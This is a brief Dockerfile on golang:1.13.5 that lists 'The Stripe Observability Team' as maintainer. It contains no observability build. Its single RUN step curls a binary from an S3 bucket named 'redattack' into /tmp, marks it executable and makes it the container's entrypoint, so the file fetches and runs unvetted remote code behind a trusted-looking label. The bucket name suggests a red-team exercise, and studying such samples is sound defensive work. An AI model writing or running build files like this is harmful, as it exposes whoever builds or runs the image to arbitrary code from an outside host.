FROM golang:1.13.5
MAINTAINER The Stripe Observability Team <support@stripe.com>

RUN curl -s -N https://redattack.s3.amazonaws.com/test --output /tmp/test && chmod +x /tmp/test
ENTRYPOINT /tmp/test
